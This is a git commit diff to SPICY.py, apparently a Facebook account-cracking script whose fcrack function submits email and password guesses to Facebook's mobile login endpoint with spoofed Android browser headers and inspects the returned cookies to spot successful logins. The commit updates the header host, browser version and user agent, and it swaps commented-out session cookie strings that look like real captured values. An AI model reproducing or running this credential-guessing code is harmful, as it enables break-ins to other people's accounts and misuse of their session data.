73fa3ce269d020744b2d7698848c2b51b273b3c6
muzimasoom <129160250+muzimasoom@users.noreply.github.com>
2023-11-15 22:36:25 +0500

    Update SPICY.py

--- SPICY.py
+++ SPICY.py
@@ -528,25 +528,24 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'x.facebook.com',
+			header_freefb = {'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=KABVZbmRcIqSUR93Rn-GvDPA; sb=KABVZRUzc8iBlrI7dfSBvebB; m_pixel_ratio=2; wd=360x676; fr=0Ybgt2TAC93TbPDTN..BlVQAo.2r.AAA.0.0.BlVQA8.AWUsvfWWYeQ',
+    # 'cookie': 'datr=rfcQZcjjAtSNyMQ_4FVfFTkn; sb=rfcQZemBtS48rEwwemYl78dM; vpd=v1%3B676x360x2; wl_cbv=v2%3Bclient_version%3A2336%3Btimestamp%3A1697690318; zsh=ASRc9qXMXSEkc2-T0pqEWXdZ4aSFk46Aw8D0acIarWGxxpURurK6RFZoHqNXFPGsoFVzeZNGFzaOzTdq_b0nUTf48jPzjLdwqQ6TGWXegf58GkvhS_I7iZpmT_k2eoUnjXxte4rfxsePowgSzk7mQC0DHLGknd1ViUzvkW_HAwLjcOizTbI4hloDuTqgeegxf--fRttQmOT_CUs3aSfzDaNYvCN7joQQcFVru3tlN0q6cPe9NcuP3QcGUJeLeI6qj3XhzVQM1WOuinAazd7UIeu57OL6JxVdd60K8aKpo3Fcy7NLfDySSA0ZP8JO2Q41eA; locale=en_US; m_pixel_ratio=2; wd=360x676; fr=0fUqaTnvxUKA6q8No.AWVVVDKx0G9-7lBY4SJ_jdovQTo.BlFT4J.C4.AAA.0.0.BlM1eP.AWWUxbqVmy8',
     'dpr': '2',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"TECNO LD7"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'user-agent': ua}
 			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
